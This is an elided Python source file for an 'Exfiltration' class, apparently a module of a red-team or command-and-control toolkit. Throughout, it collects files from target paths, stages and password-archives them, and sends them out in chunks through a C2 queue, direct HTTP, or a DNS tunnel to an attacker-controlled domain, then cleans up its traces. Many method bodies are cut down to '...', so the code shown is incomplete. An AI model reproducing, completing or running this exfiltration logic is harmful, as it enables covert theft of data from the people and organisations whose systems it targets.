...
class Exfiltration:
    ...
    def run_exfiltration(self, data: Dict[str, Any]) -> Dict[str, Any]:
        ...
        if errors:
            result["status"] = (
                ...
                or all(v.get("status") == "error" for v in result["results"].values())
        ...
        for start_path_str in paths_to_search:
            ...
            for item_path in iterator:
                ...
                if len(collected_files) >= max_files:
                    self.logger.warning(
                        f"Reached max file limit ({max_files}). Stopping collection."
                    )
    ...
    def _stage_and_archive_files(
        self, file_list: List[str], details: Dict[str, Any]
    ) -> Tuple[Optional[str], str]:
        """Copies files to a staging directory and creates an archive."""
        archive_format = details.get(
            "archive_format", self.config["default_archive_format"]
        )  # zip, tar
        archive_password = details.get("archive_password")
        compression_level = details.get(
            ...
            for file_path_str in file_list:
                try:
                    ...
                    while staged_path.exists():
                        counter += 1
                        staged_path = (
                            Path(staging_dir) / f"{file_path.stem}_{counter}{file_path.suffix}"
                        )
    ...
    def _handle_exfil_via_c2(self, details: Dict[str, Any]) -> Dict[str, Any]:
        ...
        try:
            ...
            archive_errors = ""
            if do_archive:
                archive_path, archive_errors = self._stage_and_archive_files(
                    collected_files, details
                )
                if archive_path:
            ...
            if source_path_to_read:
                ...
                try:
                    with open(source_path_to_read, "rb") as f:
                        while True:
                            ...
                            if hasattr(self.command_control, "queue_outgoing_data"):
                                ...
                                if hasattr(self.command_control, "task_results_queue") and hasattr(
                                    self.command_control, "results_lock"
                                ):
                                    with self.command_control.results_lock:
                                        self.command_control.task_results_queue.append(
                                            exfil_payload
                                        )
                                else:
                                    raise NotImplementedError(
                                        "C2 module does not have a suitable queue for exfil data."
                                    )
                    ...
                    raise OSError(f"Error reading file {source_path_to_read}: {e}") from e
                except NotImplementedError:
                    raise  # Propagate queue error
                except Exception as e:
                    raise RuntimeError(f"Error during chunking/queuing: {e}") from e
            else:
            ...
            self.logger.error(
                f"Exfil via C2 failed: {e}", exc_info=False
            )  # Keep log cleaner for known errors
            status = "failure"
        except Exception as e:
            ...
            if cleanup_staging and staging_dir_to_clean:
                try:
                    ...
                    self.logger.warning(
                        f"Failed to clean up staging directory {staging_dir_to_clean}: {e}"
                    )
                    if "error" not in result_details:
                        result_details["error"] = ""
                    result_details["error"] += (
                        f" | Cleanup Warning: Failed to delete {staging_dir_to_clean}"
                    )
            elif (
                archive_file_to_clean and not staging_dir_to_clean
            ):  # Handle cleanup if only archive created, no staging dir var set
                ...
                try:
                    ...
                    self.logger.warning(
                        f"Failed to clean up archive file {archive_file_to_clean}: {e}"
                    )
    ...
    def _handle_exfil_direct_http(self, details: Dict[str, Any]) -> Dict[str, Any]:
        ...
        try:
            ...
            staged_archive_path, staging_dir = self._stage_and_archive_files(
                collected_files, details
            )
            ...
            if staging_dir and os.path.exists(staging_dir):
                try:
                    ...
                    self.logger.warning(
                        f"Failed to clean up staging directory {staging_dir}: {clean_err}"
                    )
    ...
    def _handle_exfil_dns_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
        ...
        if not controlled_domain:
            return {
                "status": "failure",
                "reason": "Missing 'controlled_domain' in details for dns_tunnel exfil.",
            }
        ...
        self.logger.info(
            f"Starting DNS Tunnel exfiltration simulation to domain: {controlled_domain}"
        )
        ...
        try:
            ...
            for i in range(num_chunks):
                ...
                try:
                    ...
                    self.logger.warning(
                        f"Simulated DNS query for {fqdn} failed (as expected?): {e}"
                    )
                    ...
                    self.logger.error(
                        f"Unexpected error during simulated DNS query for {fqdn}: {e}"
                    )
                    failed_queries += 1
            ...
            if staging_dir and os.path.exists(staging_dir):
                ...
                try:
                    ...
                    self.logger.error(
                        f"Failed to clean up staging directory {staging_dir}: {e_clean}"
                    )
        ...
        return {
            ...
            "reason": (
                reason
                if status != "success"
                else f"Successfully simulated {simulated_queries} DNS queries."
            ),
        }

    def _handle_not_implemented(
        self, details: Dict[str, Any], method_name: str = "Unknown"
    ) -> Dict[str, Any]:
